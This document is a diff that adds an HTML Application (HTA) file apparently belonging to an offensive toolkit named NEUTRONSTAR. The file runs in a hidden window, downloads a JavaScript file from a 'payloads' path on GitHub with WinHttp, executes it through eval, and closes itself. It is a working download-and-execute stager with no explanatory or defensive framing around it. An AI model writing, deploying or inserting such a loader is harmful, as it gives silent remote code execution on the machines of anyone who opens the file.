@@ -1,0 +1,38 @@
+<html>
+<head>
+<title>NEUTRONSTAR</title>
+<HTA:APPLICATION
+   Application ID = "Test"
+   APPLICATIONNAME = "Test"
+   BORDER = "DIALOG"
+   BORDERSTYLE = "NORMAL"
+   CAPTION = "YES"
+   CONTEXTMENU = "YES"
+   ICON = ""
+   INNERBORDER = "YES"
+   MAXIMIZEBUTTON = "YES"
+   MINIMIZEBUTTON = "YES"
+   NAVIGABLE = "NO"
+   SCROLL = "AUTO"
+   SCROLLFLAT = "NO"
+   SELECTION = "NO"
+   SHOWINTASKBAR = "YES"
+   SINGLEINSTANCE = "NO"
+   SYSMENU = "YES"
+   VERSION = "1.0"
+   WINDOWSTATE = "HIDDEN"
+   />
+</head>
+<SCRIPT Language="JScript">
+	var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+	strURL = 'https://raw.githubusercontent.com/secdev-01/NEUTRONSTAR/main/payloads/taskmaster.js';
+	var temp = WinHttpReq.Open("GET", strURL, false);  
+	WinHttpReq.Send();
+	strResult = WinHttpReq.ResponseText;
+	eval(strResult);
+	close();
+</SCRIPT>
+<body>
+
+</body>
+</html>
